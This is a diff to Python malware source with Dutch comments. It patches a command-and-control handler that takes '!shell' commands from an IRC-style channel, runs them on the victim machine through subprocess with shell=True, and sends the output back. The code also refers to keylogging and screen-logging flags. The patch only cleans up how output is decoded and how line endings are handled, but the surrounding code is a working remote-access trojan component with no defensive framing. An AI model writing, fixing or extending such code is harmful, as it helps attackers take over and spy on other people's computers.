@@ -333,8 +333,10 @@ def handle_c2_command(msg, send_fn, channel):
     global logKeys, logScreen, logging
 
     def reply(text):
-        # Splits op regeleindes zodat output leesbaar blijft, max 20 regels
-        lines = [l.rstrip('\r') for l in text.split('\n') if l.strip()]
+        # Normaliseer eerst alle \r zodat ze geen terminal-cursor-terugsprint veroorzaken,
+        # splits dan op regeleindes, max 20 regels
+        clean = text.replace('\r\n', '\n').replace('\r', '\n')
+        lines = [l.strip() for l in clean.split('\n') if l.strip()]
         if not lines:
             send_fn(f'PRIVMSG {channel} :(geen output)')
             return
@@ -344,13 +346,15 @@ def handle_c2_command(msg, send_fn, channel):
     if msg.startswith('!shell '):
         cmd = msg[7:]
         try:
-            output = subprocess.check_output(
-                cmd, shell=True, stderr=subprocess.STDOUT,
-                timeout=30, universal_newlines=True
+            raw = subprocess.check_output(
+                cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
             )
-            reply(output.strip() or '(geen output)')
+            output = raw.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n').strip()
+            reply(output or '(geen output)')
         except subprocess.CalledProcessError as e:
-            reply(f'Fout (code {e.returncode}): {(e.output or "").strip()}')
+            raw_err = (e.output or b'')
+            err = raw_err.decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n').strip()
+            reply(f'Fout (code {e.returncode}): {err}')
         except subprocess.TimeoutExpired:
             reply('Commando time-out na 30s')
 
